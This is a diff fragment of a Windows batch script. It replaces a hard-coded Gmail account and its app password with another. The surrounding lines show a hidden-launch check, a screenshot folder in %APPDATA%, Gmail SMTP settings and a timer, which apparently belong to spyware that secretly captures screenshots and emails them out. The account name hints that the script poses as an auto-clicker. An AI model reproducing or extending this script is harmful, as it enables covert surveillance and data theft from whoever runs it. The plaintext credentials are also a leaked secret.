@@ -8,9 +8,9 @@ if "%~1" neq "/hidden" (
 set "screenshotFolder=%APPDATA%\screens"
 set "smtpServer=smtp.gmail.com"
 set "smtpPort=587"
-set "emailFrom=najlepszyclicker1@gmail.com"
-set "emailTo=najlepszyclicker1@gmail.com"
-set "emailPass=abtoaagbiwhqxhic"
+set "emailFrom=najlepszyclicker3@gmail.com"
+set "emailTo=najlepszyclicker3@gmail.com"
+set "emailPass=vdcsdgwewmdudpzn"
 set "delaySeconds=6"
 
 if not exist "%screenshotFolder%" mkdir "%screenshotFolder%"
